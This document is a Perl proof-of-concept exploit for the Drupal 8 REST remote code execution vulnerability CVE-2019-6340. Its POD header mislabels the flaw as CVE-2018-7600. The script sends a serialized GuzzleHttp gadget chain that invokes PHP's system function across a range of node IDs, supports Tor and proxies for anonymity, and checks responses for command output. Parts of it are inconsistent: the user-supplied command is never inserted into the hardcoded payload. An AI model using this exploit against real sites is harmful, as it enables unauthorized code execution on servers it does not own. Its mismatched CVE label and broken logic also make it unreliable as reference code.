#!/usr/bin/perl

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use Term::ANSIColor qw(colored color);
use Scalar::Util qw/reftype/;
use Socket;
use LWP::UserAgent;
use LWP::Protocol::socks;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Response;
use URI::URL;
use Getopt::Long;
use Data::Dump qw(dump);

=pod

=head1 CVE-2018-7600

=head2 Date
2018-04-17

=head2 Reporter(s)
Jos√© Ignacio Rojo

=head2 Description 
<DESCRIPTION>

=cut

# Global Variables
my $DEBUG = 0;
my $VERBOSE = 0;

# Display The Header
header();

# Run The PoC
exploit();


sub header {
    print "\n\n";
    my $title = "=================================[ CVE-2019-6340 ]=================================";
    print qq{
$title

        Exploiting Drupal8's REST RCE (SA-CORE-2019-003, CVE-2019-6340)
        ---------------------------------------------------------------

        Once again, an RCE vulnerability emerges on Drupal's core. This time it is targeting Drupal 8's REST module, which is present, although disabled, by default.
        By making use of the patch provided by Drupal, we were able to build a working exploit; furthermore, we discovered that the immediate remediation proposed
        for the vulnerability was incomplete, which could lead to a false sense of security. We therefore decided to release our findings, along with an exploit POC.

        (https://www.ambionics.io/blog/drupal8-rce)

};
    print "="x(length($title)) . "\n\n";
}

sub exploit_header {
    system("clear");
    print color("red");

    
    print color("green");
    print "\nGithub : https://github.com/gottburgm/\n";
    print "\n\n";
}

sub Help {
    print "\n";
    print qq {  
        # Usage
            perl $0  --url URL --command COMMAND --tstring TSTRING [OPTIONS]
        
        # Arguments


            --url [VALUE]		        : The Target URL [Format: scheme://host]
            --user-agent [VALUE]		: User-Agent To Send To Server
            --nid [VALUE]		        : Drupal node ID to use
            --cookie [VALUE]		    : Cookie String To Use
            --proxy [VALUE]		        : Proxy Server To Use [Format: scheme://host:port]
            --timeout [VALUE]		    : Max Timeout For The HTTP Requests
            --auth [VALUE]		        : Credentials To Use For HTTP Login [Format: username:password]
            --help        		        : Display The Help Menu
            --verbose        		    : Be More Verbose
            --debug        		        : Debug Mode
            --command [VALUE]		    : The command to execute
            --tstring [VALUE]		    : The string to match when the exploit should be considered as a success
    };
    print "\n\n";
    exit;
}

sub buildRequester {
    my $browser = 0;
    my $cookie_jar = 0;
    
    $cookie_jar = HTTP::Cookies->new(
        file     => "/tmp/cookies.lwp",
        autosave => 1,
    );
    
    $browser = LWP::UserAgent->new();
    $browser->protocols_allowed( [qw( http https ftp )] );
    $browser->requests_redirectable(['GET', 'PUT', 'DELETE', 'HEAD', 'OPTIONS']);
    $browser->cookie_jar( $cookie_jar);
    
    return $browser;
}

sub getIP {
    my ( $browser ) = @_;
    my $client_ip   = 0;
    my $client_host = 0;
    
    my $request = HTTP::Request->new('GET', 'http://monip.org');
    my $response = $browser->request($request);
    ($client_ip) = $response->content =~ /IP\s*:\s*(.*?)</i if($response->content =~ /IP\s*:\s*(.*?)</i);
    ($client_host) = $response->content =~ /<i>([^<]*)<\/i>/i if($response->content =~ /<i>.*<\/i>/i);
    print dump($response);
    if ($client_ip) {
        print "[CLIENT]   IP: " . $client_ip . "\n";
        print "[CLIENT] HOST: " . $client_host . "\n" if($client_host);
    } else {
        error("Couldn't Get Client IP");
    }
    
    return $client_ip;
}


sub buildRequest {
    my ( $url, $method, $payload, $content_type) = @_;
    $content_type = 'application/x-www-form-urlencoded' if(!defined($content_type));
    $payload = '' if(!defined($payload));
    $method = uc($method);
    my $request = 0;
    
    if($method eq "GET") {
        $payload = '?' . $payload if($payload);
        $request = HTTP::Request->new($method, $url . $payload);
    } else {
        $request = HTTP::Request->new($method, $url);
        $request->content($payload) if($payload);
    }
    $request->content_type($content_type);
    
    return $request;
}

sub exploit {
    my $browser = 0;
    my $request = 0;
    my $response = 0;
    my $method = 0;
    my $content_type = 0;
    my $base_url = 0;
    my $base_path = 0;
    my $path = 0;
    my $payload = 0;
    my $vulnerable = 1;


    my $tstring = "h3ll";	   # Command Argument : tstring
    my $url = 0;		       # Command Argument : url
    my $proxy = 0;		       # Command Argument : proxy
	my $node_id = 1;           # Command Argument : nid
    my $command = "echo h3ll"; # Command Argument : command
    my $php_code = 0;          # Command Argument: php_code
    my $tor = 0;               # Command Argument: tor
    my $cookie_string = 0;	   # Command Argument : cookie
    my $auth = 0;		       # Command Argument : auth
    my $useragent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0";		# Command Argument : user-agent
    my $timeout = 30;  		   # Command Argument : timeout

    GetOptions(
    	"tstring=s"		=> \$tstring,
        "nid=i"		    => \$node_id,
    	"url=s"	      	=> \$url,
    	"help!"		    => \&Help,
    	"verbose!"		=> \$VERBOSE,
    	"proxy=s"		=> \$proxy,
    	"command=s"		=> \$command,
    	"php-code=s"    => \$php_code,
    	"cookie=s"		=> \$cookie_string,
    	"debug!"		=> \$DEBUG,
    	"tor!"          => \$tor,
    	"auth=s"		=> \$auth,
    	"user-agent=s"	=> \$useragent,
    	"timeout=i"		=> \$timeout,
    ) or error("Bad Value(s) Provided In Command Line Arguments");

    ### Required Arguments
    die error("Required Argument(s) Missing .") if(!$url);
    exploit_header();

    if($url =~ /https?:\/\/[^\/]*\/[a-zA-Z0-9\-\.\_\/\\]+/i) {
        ($base_url, $base_path) = $url =~ /(https?:\/\/[^\/]*)(\/[^\?]*)/i;
    } else {
        $base_url = $url;
    }

    if($tor) {
        $proxy = "socks://127.0.0.1:9050";
    }

    ### Setting Up The Requester
    $browser = buildRequester();

    ### Custom Options
    $browser->timeout($timeout);
    $browser->agent($useragent);
    $browser->default_header('Cookie' => $cookie_string) if($cookie_string);

    if($proxy) {
        if($proxy =~ /([a-z])+:\/\/.*:([0-9])+/i) {
            $browser->proxy( [qw( http https ftp ftps )] => $proxy);
            getIP($browser);
        } else {
            error("Wrong Proxy String Given, Use Format : scheme://host:port");
        }
    }

    ### Build/send the requests
    my @methods = ("GET", "POST");

    for(my $nid = $node_id; $nid <= $node_id+10 ; $nid++) {
        last if($response && $vulnerable);
        $method = $methods[rand(@methods)];

        $path = '/node/' . $nid . '?_format=hal_json';
        $payload = '{
            "link": [
                {
                    "value": "link",
                    "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";s:2:\"id\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"
                }
            ],
            "_links": {
                "type": {
                    "href": "' . $url . '/rest/type/shortcut/default"
                }
            }
        }';
        $content_type = "application/hal+json";

        info("Sending exploit request on node #$nid ($url$path)");
        info("Sending : ($method) $url$path");

        $request = HTTP::Request->new($method, $url . $path);
        $request->content($payload);
        $request->content_length(length($payload));
        $request->content_type($content_type);
        $response = $browser->request($request);

        displayResponse($response);
        $vulnerable = 0 if(!validate("TSTRING", "uid=", $response));
    }

	### Validate or not the test
	if($vulnerable) {
		print "\n\n" . color("white") . "[" . color("red") . "VULNERABLE" . color("white") . "] " . color("green") . $base_url . color("white") . " is affected or any kind of validation was provided.\n";
		print $response->content . "\n";
	} else {
		print "\n\n" . color("white") . "[" . color("yellow") . "NOT VULNERABLE" . color("white") . "] " . color("green") . $base_url . color("white") . " is not affected.\n";
	}
}

sub validate {
    my ( $validation_mode, $validation_value, $response ) = @_;
    my $value = 0;
    my $positive = 1;
    my $status = "FAILED";
    my $status_color = "red";
    my $type = substr($validation_mode, 1, length($validation_mode));
    
    $positive = 0 if(substr(uc($validation_mode), 0, 1) eq 'F');
    
    given(substr($validation_mode, 1, length($validation_mode))) {
        
        when(/CODE/i) { $value = $response->code; }
        
        when(/SIZE/i) { $value = length($response->content); }
        
        when(/STRING|REGEX/i) {  $value = $response->content; }
        
        when(/HEADER/i) {
            my @header_parts = split(':', $validation_value);
            
            if($header_parts[0]) {
                if($response->header($header_parts[0])) {
                    if($header_parts[1]) {
                        return $positive if($response->header($header_parts[0]) =~ $header_parts[1]);
                    } else {
                        return $positive;
                    }
                } else {
                    warning("Expected : " . $header_parts[0] . " Not Found In Response Headers");
                    return 0;
                }
            } else {
                return 0;
            }
        }
    }
    $value = quotemeta($value);
    
    if($value && $validation_value && $validation_value =~ /$value/i || $validation_value eq $value) {
        if($VERBOSE || $DEBUG) {
            if($positive) {
                $status = "SUCESS";
                $status_color = "green";
         
                print color("white") . "   [" . color("magenta") . "V" . color("white") . "]" . color("blue") . "( " . color("$status_color") . $status . color("blue") . " ) [Validation] Expected : " . color("cyan") . "$validation_value" . color("blue") . ", Got : " . color("cyan") . "$value\n";
            }
        }
        
        return $positive;
    }
    
    return 0;
}

sub displayResponse {
    my ( $response ) = @_;
    my $request = $response->request;
    my $uri = new URI::URL $request->uri;
    
    ### Request
    print "\n\n" . color("yellow") . "--> " . color("blue") .  uc($request->method) . color("cyan") . ' ' . $uri->full_path . color("white") . " HTTP/1.1\n";
    print color("yellow") . "--> "  . color("white") . "Host: " .  color("cyan") . $request->uri->host . "\n";
    
    foreach my $header_name (keys %{ $request->headers }) {
        next if(reftype($request->header($header_name)));
        print color("yellow") . "--> "  . color("white") . $header_name . ": " . color("cyan") . $request->header($header_name) . "\n";
    }
    
    if($request->content) {
        print color("yellow") . "--> "  . color("white") . $request->content . "\n";
    }
    print "\n\n";
    
    
    ### Response
    print color("green") . "<-- "  . color("white") . "HTTP/1.1 " . color("cyan") . $response->status_line . "\n";
    
    foreach my $header_name (keys %{ $response->headers }) {
        next if(reftype($response->header($header_name)));
        print color("green") . "<-- "  . color("white") . $header_name . ": " . color("cyan") . $response->header($header_name) . "\n";
    }
    print "\n" . color("white") . $response->decoded_content . "\n";
}

sub info {
    my ( $text ) = @_;
    print color("white") . "[" . color("blue") . "*" . color("white") . "]" . color("blue") . " INFO" . color("white") . ": " . color("blue") . " $text\n";
}

sub warning {
    my ( $text ) = @_;
    print color("white") . "[" . color("yellow") . "!" . color("white") . "]" . color("yellow") . " WARNING" . color("white") . ": " . color("blue") . "$text\n";
}

sub error {
    my ( $text ) = @_;
    print color("white") . "[" . color("red") . "-" . color("white") . "]" . color("red") . " ERROR" . color("white") . ": " . color("blue") . "$text\n";
    exit;
}
